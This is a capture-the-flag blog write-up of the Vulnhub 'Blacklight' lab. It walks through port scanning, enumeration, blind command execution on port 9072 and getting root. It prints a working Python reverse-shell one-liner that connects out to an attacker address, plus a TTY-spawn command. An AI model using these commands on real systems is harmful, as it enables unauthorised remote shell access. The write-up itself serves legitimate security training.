---
layout: post
title:	"Blacklight Writeup"
date:	2018-07-22 03:00:00
categories:
    - writeups
tags:
    - ctf
    - boot2root
    - vulnhub
---
<head>
	<title> Blacklight Writup | Vulnhub </title>
</head>
<title> Blacklight Writeup </title>
![Screenshot]({{ site.baseurl }}/images/posts/2017/blacklight/logo.png)

## i. Port Scan

Full TCP port scan using unicornscan:

![Screenshot]({{ site.baseurl }}/images/posts/2017/blacklight/port.png)

~~~
$ unicornscan -Iv -r 160 -mT IP:a

-Iv = Immediately display results as they are found (-v = verbose)
-r = rate of packets to send per second
-mT = mode TCP
IP = host's ip
a = all (Scan 65535 ports)
~~~

<center> `Ports 80 and 9072 are open` </center>

## ii. Enumeration

Starting with port 80, we browse to the host.

![Screenshot]({{ site.baseurl }}/images/posts/2017/blacklight/http.png)

We got a hint, `The web is the way`.

Running a directory search to see if we can find any hidden files or directories:

![Screenshot]({{ site.baseurl }}/images/posts/2017/blacklight/dirsearch.png)

`robots.txt` seems to stand out.

![Screenshot]({{ site.baseurl }}/images/posts/2017/blacklight/robots.png)

Inside, we find flag1.txt and what seems to be a dictionary file.

Navigating to flag1.txt:

![Screenshot]({{ site.baseurl }}/images/posts/2017/blacklight/flag1.png)

Perfect, flag #1 captured.

The next hint is:
~~~
9072. The secret is at home.
~~~

Could this be referring to port 9072 that we found open in the port scan?

Connecting to port 9072 using netcat:

![Screenshot]({{ site.baseurl }}/images/posts/2017/blacklight/console.png)

It seems that we are able to execute a few commands.

Running .readhash:

![Screenshot]({{ site.baseurl }}/images/posts/2017/blacklight/hash.png)

Could this hash be related to the wordlist we found earlier?

Attempting to crack the hash using hashcat with the blacklight dictionary:

![Screenshot]({{ site.baseurl }}/images/posts/2017/blacklight/cracker.png)

Looks like the hash can't be cracked... let's move on to the next command in the console.

.exec seems like it allows us to execute commands. Let's try a basic command to see if it is executed.

`Note: Once you issue two commands to the server (including .readhash), port 9072 will close and you will have to restart the virtual machine.`

![Screenshot]({{ site.baseurl }}/images/posts/2017/blacklight/exec2.png)

Seems like the command is not executed, (or maybe it is?), but we cannot see the output.

To test our theory for blind command execution, we can host a web server and execute wget in the console to see if any connections are made:

![Screenshot]({{ site.baseurl }}/images/posts/2017/blacklight/exec.png)

Perfect, it looks like the box is making a connection to our host.

Which means that the box is executing commands, but we don't see the output (therefore it is called blind).

## iii. Reverse Shell

Since we know that the box is able to execute commands, let's try a reverse shell.

Python One Liner:
~~~
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

source: http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
~~~

Make sure to update the command with your IP Address & Listening Port.

Using Port 443 is more reliable, just in case the host has some sort of firewall setup that is blocking outbound connections on unknown ports.

![Screenshot]({{ site.baseurl }}/images/posts/2017/blacklight/revshellpart1.png)

![Screenshot]({{ site.baseurl }}/images/posts/2017/blacklight/revshellpart2.png)

After executing the command, we got a reverse shell.

We are able to use this python one-liner to spawn a TTY shell.

~~~
python -c 'import pty;pty.spawn("/bin/bash")'
~~~

![Screenshot]({{ site.baseurl }}/images/posts/2017/blacklight/pty.png)

`Looks like we are root already!`

![Screenshot]({{ site.baseurl }}/images/posts/2017/blacklight/root.png)

# IV. Conclusion

Blacklight was fun & easy. The hash rabbit hole drove me crazy for a few hours, while I tried cracking with wordlists such as rockyou, or trying to use the blacklight wordlist with rules.

Apart from that, I felt that the privilege escalation was a little incomplete, as we were elevated to root immediately.

Apart from that, I enjoyed the box.

Find the box on Vulnhub: https://www.vulnhub.com/entry/blacklight-1,242/

~~~
Sources / Links:

[0]: http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
[1]: https://www.vulnhub.com/entry/blacklight-1,242/
~~~


